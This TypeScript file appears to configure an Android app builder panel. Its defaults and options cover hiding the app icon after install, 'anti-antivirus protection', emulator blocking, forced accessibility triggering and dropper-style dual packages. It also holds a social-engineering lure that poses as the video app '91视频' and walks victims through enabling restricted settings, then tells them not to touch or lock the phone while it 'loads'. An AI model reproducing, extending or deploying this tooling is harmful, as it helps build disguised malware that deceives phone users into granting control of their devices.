import type { ApplicationBuildForm } from '#/types/application';

export function createApplicationBuildForm(): ApplicationBuildForm {
  return {
    accsstyp: 'g',
    allprims: '1',
    appid: '',
    appname: '',
    appurl: '',
    appversion: '',
    blackprims: '1',
    cname: '',
    description: '无',
    diaotype: '1',
    hidapp: '1',
    hidtype: 'f',
    icoid: '',
    logb: '确定',
    logd: '允许受限制的设置',
    loglng:
      '91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用',
    logt: 'name',
    noemu: 'black',
    notmsg: 'on',
    openaccess: '0',
    uaccess: '1',
    ukill: '1',
    uprims: '加载中~请勿操作或锁屏！',
    usedraw: '0',
  };
}

export const stateTag: Record<string, { color: string; label: string }> = {
  failed: { color: 'red', label: '失败' },
  finished: { color: 'green', label: '已完成' },
  onbuild: { color: 'orange', label: '构建中' },
};

export const selectOptions = {
  access: [
    { label: '默认', value: '0' },
    { label: '强触发', value: '1' },
  ],
  hidden: [
    { label: '卸载隐藏', value: 'f' },
    { label: '直接隐藏', value: 'c' },
    { label: '提示卸载', value: 'k' },
  ],
  install: [
    { label: '单包', value: 'g' },
    { label: '双包', value: 'd' },
  ],
  mode: [
    { label: '内', value: '0' },
    { label: '外', value: '1' },
  ],
  permission: [
    { label: '全部', value: '1' },
    { label: '文件', value: '0' },
  ],
  protect: [
    { label: '开启免杀保护', value: 'on' },
    { label: '关闭免杀保护', value: 'off' },
  ],
  switcher: [
    { label: '开启', value: '1' },
    { label: '关闭', value: '0' },
  ],
};
